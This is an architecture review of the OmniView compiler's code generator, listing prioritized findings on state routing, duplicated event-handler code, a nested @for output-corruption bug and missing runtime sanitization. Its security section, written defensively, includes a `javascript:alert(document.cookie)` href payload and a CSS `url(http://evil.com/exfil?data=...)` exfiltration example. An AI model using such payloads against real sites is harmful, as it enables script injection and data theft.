# Architecture Review: OmniView Codegen — 2026-07-29 v2

**Date**: 2026-07-29
**Review Type**: Component (follow-up to 2026-07-29 v1)
**Reviewers**: Systems Architect, Domain Expert, Security Specialist, Maintainability Expert, Performance Specialist, Implementation Strategist, AI Engineer, Pragmatic Enforcer, Rust Expert (Katya Volkov), TypeScript & React Specialist (Emma Rodriguez), Compiler & Language Architect (Dr. Lin Wei)

> Note: Documentation Expert (Samantha Quill) is defined in `members.yml` but has no corresponding subagent type — excluded from this review.

---

## Executive Summary

OmniView codegen remains a **Strong** architectural component — the Language-First design continues to be validated by industry trends, and the ADR-025 remediation wave significantly improved runtime correctness (effect leak fix, event error wrapping, cross-target parity tests). The 11-specialist review confirms: **0 CRITICAL, 6 HIGH, 23 MEDIUM, 15 LOW** findings.

**Top-line assessment**: The codegen is production-quality with 800+ passing tests and zero clippy warnings. However, this review uncovered one **previously unknown correctness bug** (the `@for` nested component buffer corruption — a silent output corruption that the Compiler Architect found independently) and **three independently confirmed code-quality issues** (`format_mutation_stmt_inline` producing invalid JS confirmed by 3 specialists; event handler duplication confirmed by 3 specialists; boolean attribute detection failure confirmed by 2 specialists).

The most concerning finding is the **nested `@for` buffer corruption**: when a component containing `@for` is inlined inside another `@for`, the inner loop's state initialization clears the outer loop's binding buffers, producing silently wrong output. This is a concrete, exploitable bug — not a theoretical concern.

**Overall Assessment**: Strong (with 6 HIGH-severity findings requiring attention)

---

## Cross-Cutting Themes

### Theme 1: Implicit State Routing (6 specialists flagged)

The `OmniViewGenerator`'s 46-field accumulator relies on undocumented conventions for which fields are live at which phase. The `std::mem::swap(&mut self.js, &mut self.deferred_js)` pattern in `emit_view()` means any method writing to `self.js` during view emission silently writes to the deferred buffer. Three mode flags (`in_for_template`, `css_only`, `editor_mode`) create 8 possible state combinations enforced only by discipline.

**Flagged by**: Systems Architect (C1-HIGH), Domain Expert (2×MEDIUM), Maintainability Expert (L2-LOW), Performance Specialist (H1-HIGH), Compiler Architect (O4, M3)

**Consensus**: Not a current bug but a **proven source of past bugs** (ADR-025's `__omni_effect` leak was a phase-confusion bug). Consensus recommendation: introduce `debug_assert!` phase guards immediately, consider `CodegenMode` enum medium-term.

### Theme 2: Structural Code Duplication (4 specialists flagged)

Three independent areas of near-identical code repetition:
- Event handler emission duplicated verbatim in `events.rs` and `component_html.rs`
- CSS-only mode blocks duplicated in `emit_element_html_close` (void vs. normal paths)
- Motion trigger JS duplicated across 12 trigger types × 2 modes (named/inline)

**Flagged by**: Domain Expert (M1-MEDIUM), Maintainability Expert (M2, M3, M4-MEDIUM), Compiler Architect (M3-MEDIUM), Implementation Strategist (C1-HIGH)

**Consensus**: The event handler duplication is the highest priority — a bug fixed in only one file would leave the other emitting broken JS. Extract a shared `emit_event_listener()` method. Motion trigger dedup is partially done (InView/Scroll/Drag unified in ADR-025), remaining triggers deferred.

### Theme 3: Compile-Time vs. Runtime Security Boundary (3 specialists flagged)

The compiler correctly treats `.omni` source as trusted at compile time, but the generated JS has no runtime sanitization layer for signal values flowing into security-sensitive DOM operations.

**Flagged by**: Security Specialist (H1-HIGH: `href`/`src` XSS, M1-MEDIUM: no CSP, M2-MEDIUM: CSS injection bypass), AI Engineer (M1-MEDIUM: no error categorization), TypeScript/React Specialist (H1-HIGH: boolean attribute detection)

**Consensus**: Add `__omni_sanitizeUrl()` runtime function for reactive URL attributes (S effort), add CSP meta tag for standalone mode (S effort), add CSS sanitization wrapper for signal-driven styles (S effort).

### Theme 4: Test Coverage Gaps (3 specialists flagged)

Five subsystems representing ~27% of code (motion_triggers, timeline, list, editor, debug) have zero or minimal unit tests. The signal runtime (~200 lines of generated JS) has no standalone behavioral tests.

**Flagged by**: Implementation Strategist (C5-LOW → elevated by cross-cutting), AI Engineer (M2-MEDIUM: runtime untested), Performance Specialist (R7-LONG: compiler benchmarks)

**Consensus**: The signal runtime is the execution substrate for all reactive behavior — testing only compiler string output is insufficient. Add standalone JS runtime tests and per-subsystem regression tests for motion/@for/editor paths.

---

## Trade-offs and Disagreements

### T1: Generator struct decomposition — when is the refactoring worth it?

**Systems Architect**: Recommends extracting `JsOutput` struct and `CodegenMode` enum (M effort, short-term).
**Pragmatic Enforcer**: Cautions against premature decomposition — "the 46-field struct has been stable through 30+ commits. Don't refactor until there's a concrete bug caused by it."
**Compilier Architect**: Agrees with Pragmatic Enforcer on the struct but argues for immediate save/restore of @for state (the concrete bug).

**Resolution**: Decompose only where a concrete bug has manifested: (1) fix @for buffer corruption with save/restore (S effort), (2) add phase assertion guards (S effort), (3) defer struct-level refactoring until after next feature cycle.

### T2: UiCodegen trait — remove or wire up?

**Pragmatic Enforcer**: Remove — ~120 lines of dead code across 3 implementations with zero call sites.
**Compiler Architect**: Remove or document as dead — the `generate_component_code` method re-runs the full pipeline if ever called (O(n²) trap).
**Implementation Strategist**: Wire it up — the trait represents the shared abstraction for multi-target component generation planned in the roadmap.

**Resolution**: Remove the dead trait implementations for now. If multi-target component generation is planned within 2 sprints, keep the trait definition (in `omnilang-core`) but remove the unused impls. Re-introduce with proper call sites when integration happens.

### T3: `(0, eval)` hot-replace — fix now or defer?

**AI Engineer**: Add try/catch guard now (S effort) — a malformed compilation blanks the component with no recovery.
**Security Specialist**: Currently adequately mitigated by iframe sandbox + origin validation. Track as tech debt.
**Pragmatic Enforcer**: Agrees with Security — "it works, it's sandboxed, defer until the sandbox model changes."

**Resolution**: Add the try/catch guard (S effort, AI Engineer recommendation) as immediate defense-in-depth. Keep long-term eval replacement on the roadmap tracked against sandbox model changes.

### T4: `querySelector` in component event dispatch — severity?

**Domain Expert**: LOW — documented as H1 from prior review, fix is XL effort (per-instance element capture).
**TypeScript/React Specialist**: MEDIUM — caches the element reference as a quick win (S effort): `MyComp_onChange._el || (MyComp_onChange._el = document.querySelector(...))`.

**Resolution**: Apply the caching fix (S effort) immediately. This doesn't solve multi-instance but eliminates repeated synchronous DOM queries. Multi-instance remains deferred (XL).

---

## Prioritized Recommendations

### Critical (0-2 weeks) — 6 items

| # | Finding | Source(s) | Effort | File(s) |
|---|---------|-----------|--------|---------|
| **C1** | **Fix `@for` buffer corruption in nested components** — Save/restore `for_text_bindings`, `for_class_bindings`, `for_attr_bindings`, `for_rebind_fn`, `in_for_template` around nested @for emission (matching existing save/restore pattern in `try_inline_component`) | Compiler Architect (HIGH) | S | `list.rs:48-62`, `component_html.rs:31-121` |
| **C2** | **Fix `format_mutation_stmt_inline` producing invalid JS** — Replace placeholder strings (`"direct_assign"`, `"increment"`) with actual JS codegen, extracting a shared `format_mutation()` helper from `emit_mutation` | Rust Expert, TypeScript/React, Maintainability (3×HIGH) | S | `stmt.rs:170-216` |
| **C3** | **Fix boolean attribute detection for complex expressions** — Replace string heuristic (`starts_with('{') && ends_with('}')`) with `ExprIR` type matching so `disabled={!condition}` works correctly | TypeScript/React Specialist (HIGH) | S | `element.rs:136-167` |
| **C4** | **Add URL sanitization for reactive `href`/`src`/`action` bindings** — `__omni_sanitizeUrl()` runtime function blocking `javascript:`, `data:`, `vbscript:` schemes | Security Specialist (HIGH) | S | `element.rs:153-156`, `runtime.rs` |
| **C5** | **Clear `for_state_names` in `emit_list_state_init`** — Add `self.for_state_names.clear()` alongside other binding clears; prevent stale data leak | Rust Expert, Domain Expert (2×LOW) | XS | `list.rs:53` |
| **C6** | **Add `debug_assert!` phase guards** — Assert `!css_only`, `!dom_emitted`, and deferred-routing state at JS emission entry points | Systems Architect (HIGH) | S | `mod.rs`, `view/element.rs`, `store.rs` |

### Important (2-8 weeks) — 10 items

| # | Finding | Source(s) | Effort |
|---|---------|-----------|--------|
| **I1** | **Extract shared event listener emission** — Single `emit_event_listener(nid, js_event, handler)` method replacing 8 duplicated addEventListener sites across `events.rs` and `component_html.rs` | Domain Expert, Maintainability, Compiler Architect (3×MEDIUM) | M |
| **I2** | **Add Content-Security-Policy meta tag** — Default CSP for standalone (non-editor) mode: `script-src 'self'; img-src 'self' data: https:` | Security Specialist (MEDIUM) | S |
| **I3** | **Add CSS sanitization for runtime signal-driven styles** — `__omni_sanitize_css()` wrapping `$signal`/`$concat`/`$call` dynamic style paths | Security Specialist (MEDIUM) | S |
| **I4** | **Add try/catch guard on `__omni_replaceComponent` eval** — Prevent blank component on malformed compilation in editor hot-replace | AI Engineer (MEDIUM) | S |
| **I5** | **Add error severity categorization** — Prefix `__omni_reportError` contexts with `warn:`/`error:`/`fatal:` for structured observability | AI Engineer (MEDIUM) | S |
| **I6** | **Eliminate ViewTree clone in `try_inline_component`** — Extract view reference before mutable borrow scope to avoid `child_view.clone()` | Performance Specialist, Rust Expert (2×MEDIUM) | M |
| **I7** | **Cache component root element in event prop dispatch** — `onChange._el || (onChange._el = querySelector(...))` avoids repeated synchronous DOM queries | TypeScript/React Specialist (MEDIUM) | XS |
| **I8** | **Replace hot-path `push_str(&format!(...))` with `write!`** — 108 call sites create unnecessary intermediate String allocations | Performance Specialist (MEDIUM) | M |
| **I9** | **Pre-build design class name HashSet** — Replace O(n×m) class validation scan with single O(1) lookup | Performance Specialist, Compiler Architect (2×MEDIUM) | S |
| **I10** | **Add standalone signal runtime tests** — JS test file exercising `__omni_signal`, `__omni_computed`, `__omni_effect`, cleanup, and edge cases | AI Engineer, Implementation Strategist (2×MEDIUM) | M |

### Nice-to-Have (2-6 months) — 8 items

| # | Finding | Source(s) | Effort |
|---|---------|-----------|--------|
| **N1** | **Incremental component codegen for editor hot-replace** — `target_component` field skips non-target JS suffix emission | Performance Specialist (HIGH→deferred) | M |
| **N2** | **Remove or wire up UiCodegen dead code** — ~120 lines across 3 backends + trait definition with zero call sites | Pragmatic Enforcer, Compiler Architect (2×MEDIUM) | S |
| **N3** | **Move `emit_conditional_html` from `editor.rs` to `view/`** — Reunite conditional rendering logic split across condition.rs and editor.rs | Pragmatic Enforcer (MEDIUM) | S |
| **N4** | **Extract CSS-only mapping blocks** — Deduplicate 31-line block repeated in void/normal tag branches of `emit_element_html_close` | Maintainability Expert (MEDIUM) | S |
| **N5** | **Extract motion trigger factories** — Unify remaining 9 trigger types (Enter/Hover/Press/Focus/Leave/Animate/Timeline) following existing InView/Scroll/Drag pattern | Implementation Strategist (HIGH→deferred), Maintainability Expert (LOW) | L |
| **N6** | **Add `new()` constructor shared by `generate()` and `test_new()`** — Eliminate 45-field duplication between production and test initialization | Maintainability Expert (MEDIUM) | M |
| **N7** | **Propagate source span length** — `len: el.source_span.map_or(0, \|s\| s.len)` instead of hardcoded 0 | Compiler Architect (MEDIUM) | XS |
| **N8** | **Add per-subsystem regression tests** — motion_triggers, timeline, @for, editor bridge — each currently at 0% unit test coverage | Implementation Strategist (LOW→elevated) | L |

---

## Cross-Target Impact Analysis

These findings affect the broader 9-target architecture:

| Finding | OmniView | React | Vue | Dioxus | Flutter | Dart | Rust | Python | JS |
|---------|----------|-------|-----|--------|---------|------|------|--------|-----|
| C2 (mutation inline codegen) | Fix needed | N/A (uses FormatStmt trait) | N/A | N/A | N/A | N/A | N/A | N/A | N/A |
| C4 (URL sanitization) | Fix needed | Shared runtime concern | Shared runtime concern | — | Platform-level | — | — | — | Shared runtime concern |
| I1 (event listener dedup) | Refactor only | Already uses shared pattern | Already uses shared pattern | Already uses shared pattern | Already uses shared pattern | — | — | — | — |
| I2 (CSP meta tag) | Fix needed | CSP via framework | CSP via framework | — | — | — | — | — | — |
| I6 (ViewTree clone) | Fix needed | N/A (different arch) | N/A | N/A | N/A | — | — | — | N/A |

**Recommendation**: C2, C4, and I6 are OmniView-specific. I1 (event listener pattern) should be elevated to a shared trait method if the pattern appears in >3 backends.

---

## Risks if Unaddressed

### Immediate Risk (this release cycle)

1. **Nested @for corruption (C1)**: Any `.omni` project using a component with `@for` inside another `@for` template will produce silently wrong output. The inner loop clears the outer loop's binding data. No compile error, no runtime error — just incorrect DOM.

2. **Boolean attribute silent failure (C3)**: `disabled={!condition}`, `checked={count > 5}`, `required={isRequired && !isAdmin}` all silently evaluate to permanent `true`. Users get broken forms with no indication of why.

3. **`href` XSS (C4)**: A user-controlled signal bound to `href` can inject `javascript:alert(document.cookie)`. While requiring specific developer patterns, the impact is full script execution in the application context. This is the most direct security vulnerability found.

4. **Invalid JS from mutation in block expressions (C2)**: If any `.omni` source contains mutation statements in expression position, the generated JS will be syntactically invalid. Currently gated by semantic analysis but the codegen path is active and untested.

### Medium-term Risk (1-3 months)

5. **Editor latency at scale**: Full recompilation for hot-replace (Performance H1) means 20+ component projects experience >500ms per-keystroke latency. Combined with 108 `push_str(&format!(...))` allocation patterns, this degrades editor UX.

6. **Event handler drift**: A fix applied to `events.rs` but not `component_html.rs` (or vice versa) creates inconsistent behavior between top-level elements and inlined component elements. The duplication is a ticking consistency bomb.

---

## Success Metrics

| Metric | Current | Target | Timeline |
|--------|---------|--------|----------|
| HIGH-severity findings | 6 | 0 | 2 weeks |
| Test coverage for motion/@for/editor subsystems | 0% | >60% line coverage | 4 weeks |
| Duplicated event handler emission points | 8 (2 files) | 1 (shared method) | 2 weeks |
| Runtime URL/CSS sanitization coverage | 0 runtime functions | `__omni_sanitizeUrl` + `__omni_sanitizeCss` | 2 weeks |
| Compiler hot-replace latency (20-comp project) | ~500ms (estimated) | <200ms | 8 weeks |
| Dead code (UiCodegen impls, mutation stubs) | ~170 lines | 0 lines | 2 weeks |

---

## Follow-up Plan

1. **Immediate** (this session): Fix C1-C6 (all S/XS effort) — address the 6 HIGH findings.
2. **This week**: Fix I1-I10 (S-M effort) — address the 10 MEDIUM findings that are S-effort.
3. **Next sprint**: Evaluate N1-N8 for roadmap inclusion; add runtime test suite; begin motion trigger dedup.
4. **ADR creation**: Create ADR-026 documenting the design decisions from this review, particularly:
   - Phase guard pattern (C6)
   - Runtime sanitization functions (C4, I3)
   - Error severity taxonomy (I5)
   - @for state save/restore pattern (C1)

---

## Per-Specialist Detailed Reviews

The full individual reviews are preserved below as source data. The aggregation above summarizes and cross-references, but does not replace these verbatim assessments.

### Systems Architect — Systems Architecture

**Perspective**: Examines how components (codegen backends, IR modules, runtime) interact as a coherent whole, focusing on data flow direction, coupling mechanisms, boundary integrity, and architecture scalability toward 9+ compilation targets.

#### Key Observations
- 9-target architecture with OmniView as feature-complete reference (2.6× larger than next backend)
- 46-field Generator with implicit state machine spanning 15 files
- Two fundamentally different instance-isolation strategies (per-instance @for vs shared global for non-@for)
- Deferred JS swap pattern creates implicit output routing
- Cross-target shared infrastructure converging (ADR-023 eliminated 8 duplicate tree-walkers)

#### Strengths
1. **Clean compiler pipeline separation**: Strictly linear Lexer→Parser→IR→Semantic→Codegen with no circular dependencies
2. **Feature-gated backends**: Each backend behind its own Cargo feature flag, isolating bugs and keeping compilation fast
3. **Shared cross-target infrastructure**: `view_tree_any`, canonical easing, trait-based formatters prevent backend drift
4. **Per-instance state for @for templates**: `__omni_forGetState` with DOM-scoped `__omniState` correctly isolates loop instances
5. **Deferred JS mechanism**: Correctly solves the DOM-availability problem without two-pass traversal

#### Concerns

**H1: Implicit mode routing creates fragile phase-to-phase consistency** (HIGH)
- **Location**: `view/mod.rs:49-77`, `component_html.rs:31-102`, `list.rs:22-30`, `mod.rs:130-134`, `mod.rs:437-536`
- **Issue**: Three `bool` flags (`in_for_template`, `css_only`, `editor_mode`) create implicit routing decisions across 25 files. The `std::mem::swap` in `emit_view()` means code writing to `self.js` is actually writing to `self.deferred_js` — invisible to callers.
- **Concrete breakage scenario**: A developer adds a new side effect in `element_to_html` that writes to `self.js` without checking whether they're in `css_only` mode or inside `emit_view`'s swap window.
- **Fix**: Add `debug_assert!` phase guards at JS emission entry points (S effort). Replace three `bool` flags with `CodegenMode` enum medium-term (M effort).

**M1: @for two-phase protocol creates temporal coupling via accumulated vectors** (MEDIUM)
- **Location**: `list.rs:22-30`, `list.rs:49-53`, `view/element.rs:170,184,747`, `view/mod.rs:170`, `list.rs:233-530`
- **Issue**: `for_text_bindings`, `for_class_bindings`, `for_attr_bindings` vectors are cleared in `emit_list_state_init`, populated during recursive `view_to_html` → `element_to_html`, consumed in `emit_list_dom`. No type-level guarantee prevents reading vectors before init or after consumption.
- **Fix**: Wrap binding vectors in a `LoopBindings` struct instantiated at entry and consumed, not stored as shared generator fields (M effort).

**M2: Five string buffers with no type-level phase execution guarantee** (MEDIUM)
- **Location**: `mod.rs:438-535`, `view/mod.rs:54,71`, `store.rs:305-308,353-358`, `motion_triggers.rs`
- **Issue**: Five buffers (`js`, `deferred_js`, `all_deferred_js`, `mount_js`, `comp_mount_js`) are all `String`. No compile-time distinction of which execution phase is being written to.
- **Fix**: Introduce `JsOutput` struct with phase-specific write methods (S effort).

**L1: Component context save/restore pattern is error-prone manual boilerplate** (LOW)
- **Location**: `component_html.rs:124-127`, `store.rs:287-335,340-398`
- **Issue**: Each inlined component, lifecycle, and effect block has manual save/restore of `current_component`, `signal_names`, `name_renames`. An early return that omits the restore breaks subsequent codegen.
- **Fix**: Use RAII guard pattern with `Drop` for automatic restore (S effort).

**L2: UiCodegen delegate regenerates all code per component** (LOW)
- **Location**: `mod.rs:711-718`
- **Issue**: `generate_component_code` calls full `generate()` for a single component, O(n) per call. Currently only used in editor hot-replace.
- **Fix**: Document the O(n) behavior; defer optimization until profiling shows it as bottleneck.

#### Recommendations

**Immediate** (S effort): Add `debug_assert!` mode guards at sensitive entry points.
**Short-term** (M effort): Extract `LoopBindings` struct and `JsOutput` phase-tracked buffer.
**Long-term** (L effort): Refactor mode flags into `CodegenMode` enum with trait-based dispatch.
**Deferred** (XL effort): Multi-instance component state isolation (ADR-025 H1).

#### Risks if Unaddressed
- Phase routing errors produce silently wrong output (events bound to non-existent DOM elements)
- UiCodegen O(n) per component → O(n²) if editor hot-replaces multiple components
- Accumulated @for bindings across nested loops (shared vector pattern)

---

### Domain Expert — Domain Model Fidelity

**Perspective**: Evaluates how faithfully the codegen represents and preserves the Omni language's domain concepts (component, signal, computed, store, design, `@for`, `@if`, motion, lifecycle) during IR→web platform translation.

#### Key Observations
1. The codegen successfully maps 12+ first-class language concepts to web platform primitives systematically
2. The 46-field Generator struct conflates all codegen phases into one mutable accumulator — no phase distinction in the type system
3. Event handler emission — the same domain logic — is duplicated nearly verbatim across `events.rs` and `component_html.rs`
4. The deferred JS buffer swap is an implicit output routing mechanism
5. Multi-instance component event dispatch uses `querySelector` instead of `querySelectorAll`

#### Strengths
1. Consistent naming convention for JS output (component-prefixed signals, store-prefixed fields, `__omni_*` namespace)
2. Clean boundary between static and dynamic content
3. Design system CSS correctly scoped via `[data-design~="..."]`
4. Conditional rendering handles both sync and wait transition modes with distinct JS paths
5. @for list rendering uses well-structured two-phase approach avoiding runtime `new Function`

#### Concerns

**M1: Event handler emission duplicated across events.rs and component_html.rs** (MEDIUM)
- **Location**: `view/events.rs:30-176`, `component_html.rs:170-237`
- **Issue**: Complete event emission pattern (FnRef, StoreAction, InlineFn with motion check, try/catch wrapping) appears in both files with pixel-identical JS output.
- **Fix**: Extract shared `emit_add_event_listener(nid, js_event, handler, sp, pd)` method (S effort).

**M2: Deferred JS buffer swap as implicit output routing** (MEDIUM)
- **Location**: `view/mod.rs:49-78`, `mod.rs:54,71`
- **Issue**: `std::mem::swap(&mut self.js, &mut self.deferred_js)` changes write target for ALL subsequent `self.js` writes without type-level indication. The `self.js` field name is a lie during the swap window.
- **Fix**: Add explicit routing guard or separate `DeferredJsBuffer` type (M effort).

**M3: `css_only` as a cross-cutting mode flag** (MEDIUM)
- **Location**: `mod.rs:216,230,241,248,258,311,380`, `view/mod.rs:201-206`, `view/element.rs:482,556`
- **Issue**: The `css_only` flag is checked at 5+ call sites to branch behavior. Adding a new feature requires adding `css_only` checks at every relevant branch.
- **Fix**: Extract CSS-only path into dedicated struct or `CodegenMode` enum (M effort).

**L1: Multi-instance component event dispatch via `querySelector`** (LOW)
- **Location**: `store.rs:244`
- **Issue**: `document.querySelector('[data-component="{name}"]')` returns only the first instance. Three instances of a component with `event onDelete` — only the first receives the event.
- **Fix**: Use `querySelectorAll` and iterate, or capture element reference via closure (L effort, deferred from ADR-025).

**L2: `for_state_names` stale data across @for loop boundaries** (LOW)
- **Location**: `mod.rs:497`, `component_html.rs:43-44`, `expr.rs:33-37`
- **Issue**: `for_state_names` is never explicitly cleared between @for loops. Guarded only by `in_for_template` flag at consumption time.
- **Fix**: Add `self.for_state_names.clear()` in `emit_list_state_init` (XS effort, 1 line).

**L3: `ElementIR.tag` double duty as both HTML tag and component name** (LOW)
- **Location**: `ir/types.rs:617-618`, `component_html.rs:18`
- **Issue**: Same field stores both HTML element tag name and component reference name. Disambiguation works via naming conventions (PascalCase vs lowercase).
- **Fix**: Add dedicated `component_ref: Option<String>` field to `ElementIR` (M effort, not urgent).

#### Recommendations
**Immediate**: Extract shared event emission, clear `for_state_names`.
**Short-term**: Add explicit routing for deferred JS, separate css_only mode.
**Long-term**: Fix multi-instance component event dispatch, add `component_ref` to IR.

---

### Security Specialist — Security Analysis

**Perspective**: Security-first evaluation of compile-time sanitization, runtime boundary protection, and the generated JS/HTML/CSS security posture.

#### Key Observations
1. Trust boundary is well-defined but unmarked at the runtime layer — no runtime sanitization for signal→DOM operations
2. Reactive attribute bindings bypass compile-time sanitizers — `el.setAttribute('href', signal.value)` with zero validation
3. CSS sanitizer is compile-time-only — signal-driven dynamic styles completely bypass it
4. No CSP in any generated output
5. Eval-based hot-replace acknowledged, sandboxed, deferred (ADR-025)

#### Strengths
1. Template literal injection comprehensively prevented with property tests (backtick, dollar, backslash escaped)
2. Consistent `escape_html` usage across all static attribute values and text content
3. Event handler try/catch wrapping is complete (8 emission points across 2 files)
4. `postMessage` origin validation uses `window.location.origin` for all cross-frame messages
5. CSS value sanitizer blocks 7+ known CSS injection vectors at compile time
6. Rational defense-in-depth architecture (sandboxed iframe + origin validation + error wrapping + capped errors)

#### Concerns

**H1: Reactive `href`/`src` attribute bindings enable URL scheme injection** (HIGH)
- **Location**: `view/element.rs:153-156`
- **Issue**: When `<a href={userSignal}>` is compiled, the generated JS calls `el.setAttribute('href', userSignal.value)` with no URL scheme validation. A user-controlled signal can inject `javascript:alert(document.cookie)`.
- **Exploit scenario**: Form with `<input bind:value={url}>` and `<a href={url}>Link</a>`. User types `javascript:alert(document.cookie)`, clicks link → arbitrary JS execution.
- **Affected attributes**: `href`, `src`, `action`, `formaction`, `xlink:href`
- **Fix**: Add `__omni_sanitizeUrl()` runtime function blocking non-http(s) schemes (S effort).

**M1: No Content-Security-Policy in generated HTML** (MEDIUM)
- **Location**: `utils.rs:232-255` (`html_document_wrapper`)
- **Issue**: Generated HTML contains no CSP meta tag. In standalone deployment, any DOM-based XSS has unrestricted script execution.
- **Fix**: Add CSP meta tag for standalone mode (S effort).

**M2: CSS injection via runtime signal-driven style bindings** (MEDIUM)
- **Location**: `view/style.rs:48,78,116-118`, `store.rs:489-498`
- **Issue**: `sanitize_css_value` is only applied to static literal values. Dynamic signal-driven styles (`$signal`, `$concat`, `$call`) bypass it entirely. A signal value containing `url(http://evil.com/exfil?data=...)` assigned to `el.style.backgroundImage` exfiltrates data.
- **Fix**: Add `__omni_sanitize_css()` runtime function (S effort).

**M3: `(0, eval)` in editor hot-replace** (MEDIUM, acknowledged/deferred)
- **Location**: `editor.rs:102`
- **Issue**: Currently mitigated by iframe sandbox + origin validation. Fragile — any sandbox change escalates to CRITICAL.
- **Fix**: Track as tech debt; add try/catch guard as immediate defense-in-depth.

**L1: No size/cardinality limits on signal values for DOM operations** (LOW)
- **Location**: Throughout `element.rs`, `style.rs`, `list.rs`
- **Issue**: Signal values can be arbitrary JS values flowing into `textContent`, `setAttribute`, `classList.toggle`, `style.prop`. No value length/type validation.
- **Fix**: Add lightweight runtime guards for extreme signal values (L effort, defense-in-depth).

#### Recommendations
**Immediate**: Add URL scheme sanitization (S).
**Short-term**: Add CSP meta tag (S), add CSS runtime sanitization (S).
**Medium-term**: Replace `(0, eval)` with structured hot-replace protocol (M).
**Long-term**: Add value size/cardinality guards (L).

#### Risks if Unaddressed
- `href`/`src` XSS: Attacker-controlled signal → `javascript:` URL → arbitrary JS execution
- CSS injection: Signal-bound CSS URL property → data exfiltration via HTTP request
- No CSP: Any injection point is game-over without defense-in-depth

---

### Maintainability Expert — Code Quality & Technical Debt

**Perspective**: Evaluates long-term maintainability, evolution capacity, and developer comprehension difficulty of the 25-file, ~10,738-line codebase.

#### Key Observations
1. 45-field monolithic state accumulator spanning 4 implicit mode flags with no type-level guarantees
2. Name resolution works across 5 parallel channels (`name_renames`, `global_renames`, `signal_names`, `store_names`, `for_state_names`)
3. Critical code paths have substantial copy-paste (event handlers, CSS-only blocks, class_map_bindings, motion triggers)
4. `format_mutation_stmt_inline` produces non-JavaScript debug strings — dead code that would produce invalid JS if called
5. `test_new()` duplicates all 45 field initializations — maintenance trap

#### Strengths
1. Modular file boundaries with clear concern separation (25 files, each with focused `impl OmniViewGenerator` block)
2. Strong error handling — all event handlers wrapped in try/catch with `__omni_reportError`
3. High test coverage — 800+ tests across 3,651 lines of test code
4. Deferred JS swap pattern (complex but justified) with documented execution order guarantee
5. Duplication removal in `emit_compound_assign` (5-way arithmetic mutation extracted to shared helper)

#### Concerns

**H1: `format_mutation_stmt_inline` produces invalid JavaScript** (HIGH)
- **Location**: `stmt.rs:170-216`
- **Issue**: Generates strings like `"{t} direct_assign {v}"` — debug representations, not valid JS. Called by `stmt_to_js_inline` → `BlockExpr` codegen in `expr_to_js`. Any `.omni` source with mutation in block expressions produces JS syntax errors.
- **Fix**: Reimplement as return-value version of `emit_mutation` producing the same valid JS. Extract shared `format_mutation()` helper (S effort).

**M1: `test_new()` duplicates 45-field constructor** (MEDIUM)
- **Location**: `mod.rs:549-597` vs `mod.rs:181-227`
- **Issue**: Adding any new field requires updates in both `generate()` inline constructor and `test_new()`. Used 28+ times. Forgetting `test_new()` means tests run with wrong defaults.
- **Fix**: Add shared `new()` constructor; `test_new()` and `generate()` both delegate to it (M effort).

**M2: CSS-only mode blocks duplicated in `emit_element_html_close`** (MEDIUM)
- **Location**: `view/element.rs:482-512` (void tags) vs `view/element.rs:556-585` (normal tags)
- **Issue**: 31 identical lines in two branches. Any change to css-only mapping logic must be applied in both places.
- **Fix**: Extract `emit_element_css_only_mappings()` helper method (S effort).

**M3: Class map bindings and interp effects duplicated between void/normal tags** (MEDIUM)
- **Location**: `view/element.rs:516-533` (void) vs `view/element.rs:592-611` (normal)
- **Issue**: 12-line class_map_bindings block and 3-line interp effects emission duplicated. The void branch has `return out;` preventing shared code.
- **Fix**: Reorganize void/non-void paths to share a common epilogue, or extract binding effects to separate method (M effort).

**M4: Event handler emission duplicated across component_html.rs and events.rs** (MEDIUM)
- **Location**: `component_html.rs:183-236`, `view/events.rs:131-173`
- **Issue**: All three `EventHandlerIR` variants verbatim duplicated across two files. Differences are cosmetic (`push_str(&format!(...))` vs `writeln!`).
- **Fix**: Extract `emit_event_listener(nid, js_event, handler, el)` shared method (M effort).

**L1: Motion trigger near-duplication across named/inline branches** (LOW)
- **Location**: `motion_triggers.rs:321-600`
- **Issue**: 12 trigger types each have a named-reference branch and an inline branch producing near-identical JS.
- **Fix**: Unify with factory-function parameter per trigger type (L effort).

**L2: Deferred JS swap makes `self.js` contextually ambiguous** (LOW)
- **Location**: `view/mod.rs:49-78`
- **Issue**: After swap, `self.js` actually writes to deferred buffer. Same function signature does different things in different contexts.
- **Fix**: Add `js_target: JsBuffer` flag with `fn write_js(&mut self, s: &str)` routing method (M effort, optional).

#### Recommendations
**Immediate**: Fix `format_mutation_stmt_inline` (S).
**Short-term**: Extract CSS-only mappings (S), merge class_map/interp effects (M), merge event handler emission (M), add shared constructor (M).
**Long-term**: Extract motion trigger factories (L), explicit buffer routing (M), decompose Generator sub-structs (XL).

---

### Performance Specialist — Performance Analysis

**Perspective**: Evaluates both compile-time output (codegen execution speed) and runtime output (generated JS efficiency).

#### Key Observations
1. Editor mode forces full recompilation — `generate_component_code` delegates to complete `generate()`, 20× cost for 20-component projects
2. String allocation bloat — 108 `push_str(&format!(...))` patterns across 19 files + 5-chained `.replace()` in `escape_html` called 31 times
3. Component inlining clones ViewTree — `child_view.clone()` at `component_html.rs:118` per nesting level
4. State containers cloned for nested components — `FxHashMap`/`FxHashSet` save/restore per nesting level
5. Generated runtime is compact and leak-free — ADR-025 fixes confirmed

#### Strengths
1. Deferred JS / mount JS separation strictly enforces correct execution order
2. Signal runtime lightweight (~200 lines), leak-free after ADR-025 fix
3. Conditional 46KB animation runtime embedding via `project_uses_motion()` guard
4. `__omni_el()` caching with `isConnected` invalidation eliminates repeated querySelector
5. @for templates avoid `new Function` — pre-compiled bindings emit inline JS

#### Concerns

**H1: Editor hot-replace triggers full codegen re-run** (HIGH)
- **Location**: `mod.rs:712-719`
- **Issue**: `generate_component_code` calls full `generate()` then discards everything except one component's JS. For 100-component project: 100× wasted work per keystroke.
- **Fix**: Add `target_component: Option<&str>` field to Generator, skip non-target JS suffix emission while preserving signal/name resolution for inlining (M effort).

**M1: Excessive intermediate string allocations on hot path** (MEDIUM)
- **Location**: 108 `push_str(&format!(...))` call sites across 19 files
- **Issue**: Each `push_str(&format!(...))` allocates, writes, copies, then frees a new String. For 500-element component tree: ~3,000-5,000 intermediate allocations.
- **Fix**: Replace with `write!`/`writeln!` directly to target buffer. Also optimize `escape_html` from 5-chained `.replace()` to single-pass StringBuilder (S-M effort).

**M2: ViewTree and state collection clones during component inlining** (MEDIUM)
- **Location**: `component_html.rs:26-29,118,125`, `store.rs:41-43,291-294,342-344`
- **Issue**: Per nesting level: full ViewTree clone + 2×FxHashMap clone + FxHashSet clone. Depth-5 nesting = 5× copies.
- **Fix**: Extract view reference before mutable borrow scope; use `std::mem::take`/`replace` for save/restore (M effort).

